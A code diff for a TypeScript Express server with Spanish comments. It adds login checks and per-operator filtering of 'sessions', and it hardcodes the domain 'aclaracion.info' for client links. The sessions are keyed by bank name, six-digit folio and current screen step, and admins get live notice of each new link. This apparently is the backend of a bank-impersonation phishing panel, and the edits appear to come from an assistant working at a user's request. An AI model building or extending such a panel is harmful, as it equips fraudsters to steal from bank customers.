@@ -446,7 +446,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.get('/api/sessions', async (req, res) => {
     try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+      
       const { type = 'current' } = req.query;
+      const user = req.user;
 
       let sessions;
       if (type === 'saved') {
@@ -455,6 +460,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
         sessions = await storage.getAllSessions();
       } else {
         sessions = await storage.getCurrentSessions();
+      }
+      
+      // Si el usuario no es administrador, filtrar para mostrar solo sus propias sesiones
+      if (user.role !== 'admin') {
+        sessions = sessions.filter(session => session.createdBy === user.username);
       }
 
       res.json(sessions);
@@ -589,22 +599,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
         banco: banco as string,
         folio: sixDigitCode,
         pasoActual: ScreenType.FOLIO,
+        createdBy: user.username,  // Añadimos el nombre del usuario que creó la sesión
       });
 
-      // Obtenemos el dominio base desde las variables de entorno
-      const { REPLIT_DOMAINS } = process.env;
-      const domain = REPLIT_DOMAINS ? REPLIT_DOMAINS.split(',')[0] : 'localhost:5000';
+      // Usar el dominio aclaracion.info según la solicitud del usuario
+      const domain = 'aclaracion.info';
 
-      // En lugar de intentar usar subdominios, usaremos rutas diferentes
-      // La ruta del cliente tendrá un prefijo especial que la hace diferente 
-      // del panel de administración
-
-      // Armamos el enlace final - usando la misma URL base pero con una ruta específica
+      // Armamos el enlace final - usando el dominio en producción
       const link = `https://${domain}/client/${sessionId}`;
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
       console.log(`URL del cliente: ${link}`);
-      console.log(`Generado por usuario: ${user.username}, Permisos de bancos: ${user.allowedBanks || 'all'}`);
+      console.log(`Generado por usuario: ${user.username}`);
 
       // Notificar a los clientes de admin sobre el nuevo enlace
       broadcastToAdmins(JSON.stringify({
@@ -642,9 +648,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
           if (data.role === 'ADMIN') {
             adminClients.add(ws);
             console.log('Admin client registered');
-
-            // Send sessions to the admin - current sessions by default
-            const sessions = await storage.getCurrentSessions();
+            
+            // Determinar si es un administrador o un usuario basado en el username
+            const userName = data.username || '';
+            const user = await storage.getUserByUsername(userName);
+            let sessions = await storage.getCurrentSessions();
+            
+            // Si no es admin, filtrar para mostrar solo sus propias sesiones
+            if (user && user.role !== 'admin') {
+              console.log(`Usuario ${userName} no es admin, filtrando sesiones`);
+              sessions = sessions.filter(session => session.createdBy === userName);
+            }
+            
             ws.send(JSON.stringify({
               type: 'INIT_SESSIONS',
               data: sessions
